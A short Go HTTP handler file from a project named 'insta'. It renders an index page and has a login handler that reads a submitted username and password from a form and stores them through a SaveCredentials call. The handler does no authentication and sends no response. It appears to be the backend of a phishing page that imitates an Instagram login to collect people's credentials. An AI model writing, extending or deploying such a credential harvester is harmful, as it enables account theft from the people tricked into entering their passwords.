package handler

import (
	"insta/pkg/config"
	"insta/pkg/render"
	"insta/pkg/save"
	"net/http"
)

// Repository is the repository type
type Repository struct {
	App *config.AppConfig
}

func NewRepo(a *config.AppConfig) *Repository {
	return &Repository{
		App: a,
	}
}

// Repo the repository used by the handlers
var Repo *Repository

// NewHandlers sets the repository for the handlers
func NewHandlers(r *Repository) {
	Repo = r
}

func (m *Repository) Index(w http.ResponseWriter, r *http.Request) {
	render.RenderTemplate(w, "index.html")
}

func (m *Repository) LoginHandler(w http.ResponseWriter, r *http.Request) {

	err := r.ParseForm()
	if err != nil {
		http.Error(w, "Error parsing form", http.StatusBadRequest)
		return
	}

	uName := r.FormValue("u_name")
	pass := r.FormValue("pass")

	save.SaveCredentials(uName, pass)

}
